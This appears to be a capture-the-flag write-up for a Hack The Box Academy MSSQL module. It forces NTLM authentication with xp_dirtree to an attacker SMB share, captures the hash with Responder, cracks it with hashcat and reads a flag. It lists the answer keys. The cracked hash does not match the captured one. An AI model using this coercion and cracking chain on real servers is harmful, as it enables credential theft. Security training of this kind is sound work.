# Section 09: Attacking SQL Databases

Module: 11. Attacking Common Services

---

## Questions & Answers

### 1. What is the password for the "mssqlsvc" user?

Context:
```bash
┌─[eu-academy-2]─[10.10.14.184]─[htb-ac-2162140@htb-6kdstm3uyc]─[~]
└──╼ [★]$ impacket-mssqlclient htbdbuser@10.129.146.120
Impacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies 

Password:
[*] Encryption required, switching to TLS
[*] ENVCHANGE(DATABASE): Old Value: master, New Value: master
[*] ENVCHANGE(LANGUAGE): Old Value: , New Value: us_english
[*] ENVCHANGE(PACKETSIZE): Old Value: 4096, New Value: 16192
[*] INFO(WIN-02\SQLEXPRESS): Line 1: Changed database context to 'master'.
[*] INFO(WIN-02\SQLEXPRESS): Line 1: Changed language setting to us_english.
[*] ACK: Result: 1 - Microsoft SQL Server (150 7208) 
[!] Press help for extra shell commands
SQL (htbdbuser  guest@master)> EXEC master..xp_dirtree '\\10.10.14.184\share\'
subdirectory   depth   
------------   -----   
SQL (htbdbuser  guest@master)> 
```
```bash
┌─[eu-academy-2]─[10.10.14.184]─[htb-ac-2162140@htb-6kdstm3uyc]─[~]
└──╼ [★]$ sudo responder -I tun0
                                         __
  .----.-----.-----.-----.-----.-----.--|  |.-----.----.
  |   _|  -__|__ --|  _  |  _  |     |  _  ||  -__|   _|
  |__| |_____|_____|   __|_____|__|__|_____||_____|__|
                   |__|

           NBT-NS, LLMNR & MDNS Responder 3.1.3.0

  To support this project:
  Patreon -> https://www.patreon.com/PythonResponder
  Paypal  -> https://paypal.me/PythonResponder

  Author: Laurent Gaffie (laurent.gaffie@gmail.com)
  To kill this script hit CTRL-C


[+] Poisoners:
    LLMNR                      [ON]
    NBT-NS                     [ON]
    MDNS                       [ON]
    DNS                        [ON]
    DHCP                       [OFF]

[+] Servers:
    HTTP server                [ON]
    HTTPS server               [ON]
    WPAD proxy                 [OFF]
    Auth proxy                 [OFF]
    SMB server                 [ON]
    Kerberos server            [ON]
    SQL server                 [ON]
    FTP server                 [ON]
    IMAP server                [ON]
    POP3 server                [ON]
    SMTP server                [ON]
    DNS server                 [ON]
    LDAP server                [ON]
    RDP server                 [ON]
    DCE-RPC server             [ON]
    WinRM server               [ON]

[+] HTTP Options:
    Always serving EXE         [OFF]
    Serving EXE                [OFF]
    Serving HTML               [OFF]
    Upstream Proxy             [OFF]

[+] Poisoning Options:
    Analyze Mode               [OFF]
    Force WPAD auth            [OFF]
    Force Basic Auth           [OFF]
    Force LM downgrade         [OFF]
    Force ESS downgrade        [OFF]

[+] Generic Options:
    Responder NIC              [tun0]
    Responder IP               [10.10.14.184]
    Responder IPv6             [dead:beef:2::10b6]
    Challenge set              [random]
    Don't Respond To Names     ['ISATAP']

[+] Current Session Variables:
    Responder Machine Name     [WIN-78M3BIITAKK]
    Responder Domain Name      [UD9E.LOCAL]
    Responder DCE-RPC Port     [48916]

[+] Listening for events...

[!] Error starting TCP server on port 80, check permissions or other servers running.
[!] Error starting TCP server on port 53, check permissions or other servers running.
[SMB] NTLMv2-SSP Client   : 10.129.146.120
[SMB] NTLMv2-SSP Username : WIN-02\mssqlsvc
[SMB] NTLMv2-SSP Hash     : mssqlsvc::WIN-02:03a3b6b79f86c611:3F971201729DA4EA5810A596B4BC7EA0:010100000000000080CA670B1927DD01094EBFEC75DC98E00000000002000800550044003900450001001E00570049004E002D00370038004D003300420049004900540041004B004B0004003400570049004E002D00370038004D003300420049004900540041004B004B002E0055004400390045002E004C004F00430041004C000300140055004400390045002E004C004F00430041004C000500140055004400390045002E004C004F00430041004C000700080080CA670B1927DD0106000400020000000800300030000000000000000000000000300000FD3E8B9EB2E3C2A93A3C31F20F153991A968FBE2E6D1C319C83B4B669FC1D9020A001000000000000000000000000000000000000900220063006900660073002F00310030002E00310030002E00310034002E003100380034000000000000000000
```
- Crack the hash:
```bash
┌─[eu-academy-2]─[10.10.14.184]─[htb-ac-2162140@htb-6kdstm3uyc]─[~]
└──╼ [★]$ echo "mssqlsvc::WIN-02:00598b5d1b0d91da:6A17E1B2780D4FF5BD389053521038A5:010100000000000080D16572B499DB01E3F9784A4CDF5E9B0000000002000800440053003800300001001E00570049004E002D0031004300550052004E004900590054004E0045004F002E0044005300380030002E004C004F00430041004C000300140044005300380030002E004C004F00430041004C000500140044005300380030002E004C004F00430041004C000700080080D16572B499DB0106000400020000000800300030000000000000000000000000300000DC2769331B161770BD2C2A6578996B418ACDE22E93439BC50C8147CCD61CAF4F0A001000000000000000000000000000000000000900200063006900660073002F00310030002E00310030002E00310035002E00350033000000000000000000" > hash.txt
┌─[eu-academy-2]─[10.10.14.184]─[htb-ac-2162140@htb-6kdstm3uyc]─[~]
└──╼ [★]$ hashcat -m 5600 hash.txt /usr/share/wordlists/rockyou.txt

MSSQLSVC::WIN-02:00598b5d1b0d91da:6a17e1b2780d4ff5bd389053521038a5:010100000000000080d16572b499db01e3f9784a4cdf5e9b0000000002000800440053003800300001001e00570049004e002d0031004300550052004e004900590054004e0045004f0004003400570049004e002d0031004300550052004e004900590054004e0045004f002e0044005300380030002e004c004f00430041004c000300140044005300380030002e004c004f00430041004c000500140044005300380030002e004c004f00430041004c000700080080d16572b499db0106000400020000000800300030000000000000000000000000300000dc2769331b161770bd2c2a6578996b418acde22e93439bc50c8147ccd61caf4f0a001000000000000000000000000000000000000900200063006900660073002f00310030002e00310030002e00310035002e00350033000000000000000000:princess1
```

**Answer:** `princess1`

---

### 2. Enumerate the "flagDB" database and submit a flag as your answer.

Context:
```bash
┌─[eu-academy-2]─[10.10.14.184]─[htb-ac-2162140@htb-6kdstm3uyc]─[~]
└──╼ [★]$ impacket-mssqlclient MSSQLSVC@10.129.146.120 -windows-auth
Impacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies 

Password:
[*] Encryption required, switching to TLS
[*] ENVCHANGE(DATABASE): Old Value: master, New Value: master
[*] ENVCHANGE(LANGUAGE): Old Value: , New Value: us_english
[*] ENVCHANGE(PACKETSIZE): Old Value: 4096, New Value: 16192
[*] INFO(WIN-02\SQLEXPRESS): Line 1: Changed database context to 'master'.
[*] INFO(WIN-02\SQLEXPRESS): Line 1: Changed language setting to us_english.
[*] ACK: Result: 1 - Microsoft SQL Server (150 7208) 
[!] Press help for extra shell commands
SQL (WIN-02\mssqlsvc  guest@master)> SELECT table_name FROM flagDB.INFORMATION_SCHEMA.TABLES
table_name   
----------   
tb_flag      

SQL (WIN-02\mssqlsvc  guest@master)> SELECT * FROM tb_flag
ERROR(WIN-02\SQLEXPRESS): Line 1: Invalid object name 'tb_flag'.
SQL (WIN-02\mssqlsvc  guest@master)> SELECT * FROM flagDB.tb_flag
ERROR(WIN-02\SQLEXPRESS): Line 1: Invalid object name 'flagDB.tb_flag'.
SQL (WIN-02\mssqlsvc  guest@master)> SELECT * FROM flagDB.dbo.tb_flag
flagvalue                              
------------------------------------   
b'HTB{!_l0v3_#4$#!n9_4nd_r3$p0nd3r}'   

SQL (WIN-02\mssqlsvc  guest@master)> 
```

**Answer:** `HTB{!_l0v3_#4$#!n9_4nd_r3$p0nd3r}`

---

[Back to Module Index](./README.md)
